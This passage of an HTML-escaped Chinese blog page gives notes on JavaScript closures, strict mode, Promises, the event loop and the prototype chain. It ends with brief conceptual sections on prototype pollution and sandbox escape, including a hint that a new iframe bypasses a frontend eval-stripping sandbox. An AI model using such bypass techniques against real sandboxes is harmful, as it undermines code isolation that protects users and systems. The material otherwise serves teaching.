punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      &lt;span class=&#34;token function&#34;&gt;changeBy&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token function-variable function&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; privateCounter&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;console&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;Counter&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;/* logs 0 */&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Counter&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;increment&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Counter&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;increment&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;console&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;Counter&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;/* logs 2 */&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Counter&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;decrement&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;console&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;Counter&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;/* logs 1 */&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;全局对象&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#全局对象&#34;&gt;#&lt;/a&gt; 全局对象&lt;/h2&gt;
&lt;p&gt;全局对象是一个特殊的对象，它的作用域是全局的。&lt;/p&gt;
&lt;p&gt;全平台可用的全局对象是  &lt;code&gt;globalThis&lt;/code&gt;  ，它跟全局作用域里的 this 值相同。另外在浏览器中存在  &lt;code&gt;self&lt;/code&gt;  和  &lt;code&gt;window&lt;/code&gt;  全局对象，Web Workers 中存在  &lt;code&gt;self&lt;/code&gt;  全局对象，Node.js 中存在  &lt;code&gt;global&lt;/code&gt;  全局对象。&lt;/p&gt;
&lt;h1 id=&#34;严格模式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#严格模式&#34;&gt;#&lt;/a&gt; 严格模式&lt;/h1&gt;
&lt;h2 id=&#34;简介-3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介-3&#34;&gt;#&lt;/a&gt; 简介&lt;/h2&gt;
&lt;p&gt;在 ES5 中，除了正常的运行模式之外，添加了严格模式（strict mode），这种模式使得代码显式地脱离 “马虎模式 / 稀松模式 / 懒散模式 “（sloppy）模式在更严格的条件下运行。严格模式不仅仅是一个子集：它的产生是为了形成与正常代码不同的语义。&lt;/p&gt;
&lt;p&gt;引入严格模式的目的主要是：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;通过抛出错误来消除了一些原有静默错误&lt;/li&gt;
&lt;li&gt;消除 JavaScript 语法的一些不合理、不严谨之处，减少一些怪异行为&lt;/li&gt;
&lt;li&gt;消除代码运行的一些不安全之处，保证代码运行的安全&lt;/li&gt;
&lt;li&gt;修复了一些导致 JavaScript 引擎难以执行优化的缺陷，提高编译器效率，增加运行速度&lt;/li&gt;
&lt;li&gt;禁用了在 ECMAScript 的未来版本中可能会定义的一些语法，为未来新版本的 JavaScript 做铺垫&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;调用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#调用&#34;&gt;#&lt;/a&gt; 调用&lt;/h2&gt;
&lt;p&gt;严格模式使用  &lt;code&gt;&amp;quot;use strict&amp;quot;;&lt;/code&gt;  字符串开启。对整个脚本文件而言，可以将  &lt;code&gt;&amp;quot;use strict&amp;quot;&lt;/code&gt;  放在脚本文件的第一行使整个脚本以严格模式运行。如果这行语句不在第一行则不会生效，会以正常模式运行。&lt;/p&gt;
&lt;p&gt;对单个函数而言，将  &lt;code&gt;&amp;quot;use strict&amp;quot;&lt;/code&gt;  放在函数体的第一行，则整个函数以严格模式运行。&lt;/p&gt;
&lt;h2 id=&#34;行为改变&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#行为改变&#34;&gt;#&lt;/a&gt; 行为改变&lt;/h2&gt;
&lt;p&gt;在严格模式中，主要有以下的行为更改：&lt;/p&gt;
&lt;h3 id=&#34;全局变量显式声明&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#全局变量显式声明&#34;&gt;#&lt;/a&gt; 全局变量显式声明&lt;/h3&gt;
&lt;p&gt;在正常模式中，如果一个变量没有声明就赋值，默认是全局变量。严格模式禁止这种用法，全局变量必须显式声明。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-JavaScript&#34;&gt;&amp;quot;use strict&amp;quot;;
for(i = 0; i &amp;lt; 2; i++) &amp;#123; // ReferenceError: i is not defined
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;禁止使用with语句&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#禁止使用with语句&#34;&gt;#&lt;/a&gt; 禁止使用 with 语句&lt;/h3&gt;
&lt;p&gt;with 语句无法在编译时就确定，属性到底归属哪个对象，这会影响编译效率，所以在严格模式中被禁止。&lt;/p&gt;
&lt;h3 id=&#34;创设eval作用域&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#创设eval作用域&#34;&gt;#&lt;/a&gt; 创设 eval 作用域&lt;/h3&gt;
&lt;p&gt;正常模式下，eval 语句的作用域，取决于它处于全局作用域，还是处于函数作用域。严格模式下，eval 语句本身就是一个作用域，不再能够生成全局变量了，它所生成的变量只能用于 eval 内部。&lt;/p&gt;
&lt;h3 id=&#34;禁止删除变量&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#禁止删除变量&#34;&gt;#&lt;/a&gt; 禁止删除变量&lt;/h3&gt;
&lt;p&gt;严格模式下无法删除变量。只有 configurable 设置为 true 的对象属性，才能被删除。&lt;/p&gt;
&lt;h3 id=&#34;显式报错&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#显式报错&#34;&gt;#&lt;/a&gt; 显式报错&lt;/h3&gt;
&lt;p&gt;正常模式下一些错误只会默默地失败，但是严格模式下将会报错，包括以下几种场景：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;对一个对象的只读属性进行赋值&lt;/li&gt;
&lt;li&gt;对一个使用 getter 方法读取的属性进行赋值&lt;/li&gt;
&lt;li&gt;对禁止扩展的对象添加新属性&lt;/li&gt;
&lt;li&gt;删除一个不可删除的属性&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;语法错误&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#语法错误&#34;&gt;#&lt;/a&gt; 语法错误&lt;/h3&gt;
&lt;p&gt;严格模式新增了一些语法错误，包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;对象不能有重名的属性&lt;/li&gt;
&lt;li&gt;函数不能有重名的参数&lt;/li&gt;
&lt;li&gt;禁止八进制表示法&lt;/li&gt;
&lt;li&gt;函数必须声明在顶层&lt;/li&gt;
&lt;li&gt;新增保留字
&lt;ul&gt;
&lt;li&gt;class&lt;/li&gt;
&lt;li&gt;enum&lt;/li&gt;
&lt;li&gt;export&lt;/li&gt;
&lt;li&gt;extends&lt;/li&gt;
&lt;li&gt;import&lt;/li&gt;
&lt;li&gt;super&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;安全增强&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#安全增强&#34;&gt;#&lt;/a&gt; 安全增强&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;禁止 this 关键字指向全局对象&lt;/li&gt;
&lt;li&gt;禁止在函数内部遍历调用栈&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;限制arguments对象&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#限制arguments对象&#34;&gt;#&lt;/a&gt; 限制 arguments 对象&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;不允许对 arguments 赋值&lt;/li&gt;
&lt;li&gt;arguments 不再追踪参数的变化&lt;/li&gt;
&lt;li&gt;禁止使用 arguments.callee&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;异步机制&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#异步机制&#34;&gt;#&lt;/a&gt; 异步机制&lt;/h1&gt;
&lt;h2 id=&#34;async-await&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#async-await&#34;&gt;#&lt;/a&gt; async / await&lt;/h2&gt;
&lt;p&gt;async function 关键字用来在表达式中定义异步函数。&lt;/p&gt;
&lt;h2 id=&#34;promise&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#promise&#34;&gt;#&lt;/a&gt; Promise&lt;/h2&gt;
&lt;p&gt;Promise 对象是一个代理对象（代理一个值），被代理的值在 Promise 对象创建时可能是未知的。它允许你为异步操作的成功和失败分别绑定相应的处理方法（handlers）。 这让异步方法可以像同步方法那样返回值，但并不是立即返回最终执行结果，而是一个能代表未来出现的结果的 promise 对象&lt;/p&gt;
&lt;p&gt;一个 Promise 有以下几种状态:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;pending: 初始状态，既不是成功，也不是失败状态。&lt;/li&gt;
&lt;li&gt;fulfilled: 意味着操作成功完成。&lt;/li&gt;
&lt;li&gt;rejected: 意味着操作失败。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;pending 状态的 Promise 对象可能会变为 fulfilled 状态并传递一个值给相应的状态处理方法，也可能变为失败状态（rejected）并传递失败信息。当其中任一种情况出现时，Promise 对象的 then 方法绑定的处理方法（handlers ）就会被调用（then 方法包含两个参数：onfulfilled 和 onrejected，它们都是 Function 类型。当 Promise 状态为 fulfilled 时，调用 then 的 onfulfilled 方法，当 Promise 状态为 rejected 时，调用 then 的 onrejected 方法， 所以在异步操作的完成和绑定处理方法之间不存在竞争）。&lt;/p&gt;
&lt;p&gt;因为 Promise.prototype.then 和 Promise.prototype.catch 方法返回 promise 对象， 所以它们可以被链式调用。&lt;/p&gt;
&lt;h2 id=&#34;执行队列&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#执行队列&#34;&gt;#&lt;/a&gt; 执行队列&lt;/h2&gt;
&lt;p&gt;JavaScript 中的异步运行机制如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;所有同步任务都在主线程上执行，形成一个执行栈&lt;/li&gt;
&lt;li&gt;主线程之外，还存在一个任务队列。只要异步任务有了运行结果，就在任务队列之中放置一个事件。&lt;/li&gt;
&lt;li&gt;一旦执行栈中的所有同步任务执行完毕，系统就会读取任务队列，看看里面有哪些事件。那些对应的异步任务，于是结束等待状态，进入执行栈，开始执行。&lt;/li&gt;
&lt;li&gt;主线程不断重复上面的第三步。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;其中浏览器的内核是多线程的，在浏览器的内核中不同的异步操作由不同的浏览器内核模块调度执行，异步操作会将相关回调添加到任务队列中。可以分为 DOM 事件、时间回调、网络回调三种：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;DOM 事件：由浏览器内核的 DOM 模块来处理，当事件触发的时候，回调函数会被添加到任务队列中。&lt;/li&gt;
&lt;li&gt;时间回调：setTimeout /setInterval 等函数会由浏览器内核的 timer 模块来进行延时处理，当时间到达的时候，将回调函数添加到任务队列中。&lt;/li&gt;
&lt;li&gt;网络回调：ajax /fetch 等则由浏览器内核的 network 模块来处理，在网络请求完成返回之后，才将回调添加到任务队列中。&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;原型链&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#原型链&#34;&gt;#&lt;/a&gt; 原型链&lt;/h1&gt;
&lt;h2 id=&#34;显式原型和隐式原型&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#显式原型和隐式原型&#34;&gt;#&lt;/a&gt; 显式原型和隐式原型&lt;/h2&gt;
&lt;p&gt;JavaScript 的原型分为显式原型（explicit prototype property）和隐式原型（implicit prototype link）。&lt;/p&gt;
&lt;p&gt;其中显式原型指 prototype，是函数的一个属性，这个属性是一个指针，指向一个对象，显示修改对象的原型的属性，只有函数才有该属性&lt;/p&gt;
&lt;p&gt;隐式原型指 JavaScript 中任意对象都有的内置属性 prototype。在 ES5 之前没有标准的方法访问这个内置属性，但是大多数浏览器都支持通过  &lt;code&gt;__proto__&lt;/code&gt;  来访问。ES5 中有了对于这个内置属性标准的 Get 方法  &lt;code&gt;Object.getPrototypeOf()&lt;/code&gt;  。&lt;/p&gt;
&lt;p&gt;隐式原型指向创建这个对象的函数 (constructor) 的 prototype，  &lt;code&gt;__proto__&lt;/code&gt;  指向的是当前对象的原型对象，而 prototype 指向的，是以当前函数作为构造函数构造出来的对象的原型对象。&lt;/p&gt;
&lt;p&gt;显式原型的作用用来实现基于原型的继承与属性的共享。 隐式原型的用于构成原型链，同样用于实现基于原型的继承。举个例子，当我们访问 obj 这个对象中的 x 属性时，如果在 obj 中找不到，那么就会沿着  &lt;code&gt;__proto__&lt;/code&gt;  依次查找。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Note: Object.prototype 这个对象是个例外，它的__proto__值为null
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;new-的过程&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#new-的过程&#34;&gt;#&lt;/a&gt; new 的过程&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-JavaScript&#34;&gt;var Person = function()&amp;#123;&amp;#125;;
var p = new Person();
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;new 的过程拆分成以下三步： -  &lt;code&gt;var p=&amp;#123;&amp;#125;;&lt;/code&gt;  初始化一个对象 p -  &lt;code&gt;p.__proto__ = Person.prototype;&lt;/code&gt;  -  &lt;code&gt;Person.call(p);&lt;/code&gt;  构造 p，也可以称之为初始化 p&lt;/p&gt;
&lt;p&gt;关键在于第二步，我们来证明一下：&lt;/p&gt;
&lt;figure class=&#34;highlight javascript&#34;&gt;&lt;figcaption data-lang=&#34;javascript&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;token function-variable function&#34;&gt;Person&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;var&lt;/span&gt; p &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Person&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;alert&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;__proto__ &lt;span class=&#34;token operator&#34;&gt;===&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Person&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;prototype&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;这段代码会返回 true。说明我们步骤 2 是正确的。&lt;/p&gt;
&lt;h2 id=&#34;示例&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#示例&#34;&gt;#&lt;/a&gt; 示例&lt;/h2&gt;
&lt;figure class=&#34;highlight javascript&#34;&gt;&lt;figcaption data-lang=&#34;javascript&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;token function-variable function&#34;&gt;Person&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token class-name&#34;&gt;Person&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;prototype&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function-variable function&#34;&gt;sayName&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token function&#34;&gt;alert&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;My Name is Jacky&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token class-name&#34;&gt;Person&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;prototype&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;age &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;27&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;var&lt;/span&gt; p &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Person&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;sayName&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;p 是一个引用指向 Person 的对象。我们在 Person 的原型上定义了一个 sayName 方法和 age 属性，当我们执行 p.age 时，会先在 this 的内部查找（也就是构造函数内部），如果没有找到然后再沿着原型链向上追溯。&lt;/p&gt;
&lt;p&gt;这里的向上追溯是怎么向上的呢？这里就要使用  &lt;code&gt;__proto__&lt;/code&gt;  属性来链接到原型（也就是 Person.prototype）进行查找。最终在原型上找到了 age 属性。&lt;/p&gt;
&lt;h2 id=&#34;原型链污染&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#原型链污染&#34;&gt;#&lt;/a&gt; 原型链污染&lt;/h2&gt;
&lt;p&gt;如前文提到的，JavaScript 是动态继承，通过  &lt;code&gt;__proto__&lt;/code&gt;  修改自身对象时会影响到有相同原型的对象。因此当键值对是用户可控的情况下，就可能出现原型链污染。&lt;/p&gt;
&lt;h1 id=&#34;沙箱逃逸&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#沙箱逃逸&#34;&gt;#&lt;/a&gt; 沙箱逃逸&lt;/h1&gt;
&lt;h2 id=&#34;前端沙箱&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#前端沙箱&#34;&gt;#&lt;/a&gt; 前端沙箱&lt;/h2&gt;
&lt;p&gt;在前端中，可能会使用删除  &lt;code&gt;eval&lt;/code&gt;  ，重写  &lt;code&gt;Function.prototype.constructor&lt;/code&gt;  /  &lt;code&gt;GeneratorFunction&lt;/code&gt;  /  &lt;code&gt;AsyncFunction&lt;/code&gt;  等方式来完成前端的沙箱。在这种情况下，可以使用创建一个新 iframe 的方式来获取新的执行环境。&lt;/p&gt;
&lt;h2 id=&#34;服务端沙箱&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#服务端沙箱&#34;&gt;#&lt;/a&gt; 服务端沙箱&lt;/h2&gt;
&lt;p&gt;JavaScript 提供了原生的 vm 模块，用于隔离了代码上下文环境。但是在该环境中依然可以访问标准的 JavaScript API 和全局的 NodeJS 环境。&lt;/p&gt;
